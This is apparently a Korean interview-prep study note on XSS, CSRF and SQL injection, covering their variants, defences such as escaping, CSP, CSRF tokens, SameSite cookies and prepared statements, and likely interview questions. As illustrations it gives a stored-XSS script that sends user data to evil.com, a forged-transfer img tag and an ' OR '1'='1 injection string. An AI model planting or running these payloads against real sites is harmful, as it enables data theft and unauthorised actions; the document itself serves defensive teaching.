# 웹 취약점 (XSS, CSRF, SQL Injection)

OWASP Top 10에 단골로 등장하는 3종. 백엔드 면접 빈출 1순위.

---

## 1. XSS (Cross-Site Scripting)
공격자가 **악성 스크립트**를 웹 페이지에 주입해, 다른 사용자의 브라우저에서 실행되게 하는 공격.

### 종류
- **Stored XSS**: 게시판·댓글 등 DB에 저장된 스크립트가 다른 사용자에게 노출 (가장 위험)
- **Reflected XSS**: URL 파라미터에 스크립트, 링크 클릭 시 실행
- **DOM-based XSS**: 서버 응답 없이 클라이언트 JS가 DOM을 위험하게 조작

### 예시
사용자가 댓글에 `<script>fetch('/api/me').then(r=>r.json()).then(d=>fetch('https://evil.com?d='+JSON.stringify(d)))</script>` 작성 → 다른 사용자 접속 시 그 사람 정보가 evil.com으로 전송

### 방어
- **출력 시 이스케이프** (서버/템플릿 엔진에서 `<`, `>`, `"`, `'`, `&` 변환)
- **HTML Sanitizer** 사용 (DOMPurify 등) — 리치 텍스트가 필요한 경우
- **CSP (Content Security Policy)** — `script-src 'self'` 등 외부 스크립트 차단
- **HttpOnly 쿠키** — JS로 쿠키 접근 차단 → 세션 탈취 방어
- 입력 검증 (URL은 `http(s):` 만, `javascript:` 금지)

---

## 2. CSRF (Cross-Site Request Forgery)
**로그인된 사용자**를 속여, 사용자가 의도하지 않은 요청을 본인 권한으로 보내게 하는 공격.

### 동작
1. 피해자가 A 사이트에 로그인 (쿠키 보유)
2. 공격자가 만든 B 사이트 방문
3. B 페이지가 자동으로 A에 요청 전송 (`<img src="https://bank.com/transfer?to=attacker&amount=1000000">`)
4. 브라우저가 **A의 쿠키를 자동 첨부** → 서버는 정상 요청으로 처리

### 방어
- **CSRF Token**: 폼 제출 시 서버가 발급한 랜덤 토큰을 함께 전송, 서버에서 검증 (Spring Security 기본)
- **SameSite 쿠키**: `Lax` 또는 `Strict` → 크로스사이트에서 쿠키 자동 전송 차단
- **Double Submit Cookie**: 쿠키와 헤더에 같은 토큰 동시 전송 (JS가 쿠키 → 헤더 복사)
- **Origin / Referer 검증**
- **민감 작업은 재인증** (비밀번호 재입력)

### REST API + JWT는 CSRF 안전한가?
- **헤더에 Bearer 토큰**으로 보낸다면 안전 (JS만이 헤더 추가 가능, 자동 첨부 X)
- **쿠키에 JWT를 저장**한다면 CSRF 위험 존재 → SameSite·CSRF 토큰 필요

---

## 3. SQL Injection
사용자 입력이 SQL 쿼리에 그대로 합쳐져 의도와 다른 쿼리가 실행되는 공격.

### 예시
```java
// 취약
String sql = "SELECT * FROM users WHERE name = '" + input + "'";
// input = "' OR '1'='1"
// → SELECT * FROM users WHERE name = '' OR '1'='1'  → 전체 노출
```

### 방어
- **Prepared Statement / 파라미터 바인딩** — 입력을 데이터로 처리, SQL 구조 변경 불가
  ```java
  // 안전 (JPA / MyBatis #{} / JDBC PreparedStatement)
  em.createQuery("SELECT u FROM User u WHERE u.name = :n")
    .setParameter("n", input);
  ```
- **ORM 사용** (JPA, QueryDSL) — 기본적으로 바인딩
- ⚠️ MyBatis의 `${}` 는 문자열 치환 → 위험. `#{}` (바인딩) 사용
- ⚠️ JPA의 **Native Query에 문자열 합치기** 금지
- **최소 권한 원칙** — 앱 DB 계정에 필요한 권한만 부여
- **에러 메시지 노출 금지** — 스택트레이스에서 테이블/컬럼 정보 누출 방지

---

## 비교 요약
| | XSS | CSRF | SQLi |
| --- | --- | --- | --- |
| 공격 대상 | **사용자 브라우저** | **사용자 권한** (서버) | **DB** |
| 핵심 | 스크립트 실행 | 위조 요청 | 쿼리 조작 |
| 1순위 방어 | 출력 이스케이프 + CSP | CSRF 토큰 + SameSite | Prepared Statement |

## 면접 빈출 질문
1. **XSS와 CSRF의 차이?** → 공격 대상이 사용자 브라우저(XSS) vs 사용자 세션을 이용한 서버 요청(CSRF)
2. **XSS 방어 방법?** → 출력 이스케이프, HttpOnly 쿠키, CSP, Sanitizer
3. **HttpOnly와 SameSite가 각각 막는 공격은?** → HttpOnly=XSS로 토큰 탈취 방어 / SameSite=CSRF 방어
4. **CSRF 토큰 동작 방식?** → 서버가 폼/세션에 랜덤 토큰 심고, 요청 시 같이 보내 검증
5. **JWT를 헤더로 보내면 CSRF가 안전한 이유?** → 헤더는 브라우저가 자동 첨부 안 함, JS만 추가 가능
6. **SQL Injection 방어의 가장 확실한 방법?** → Prepared Statement(파라미터 바인딩). 문자열 합치기 절대 금지
7. **JPA가 SQLi에 안전한 이유?** → JPQL/QueryDSL 모두 내부적으로 파라미터 바인딩

## 프로젝트 연결
- Spring Security: CSRF 기본 활성화 (REST + Stateless JWT는 disable 가능)
- JPA + QueryDSL: SQLi 자동 방어 (단, Native + 문자열 합치기는 여전히 위험)
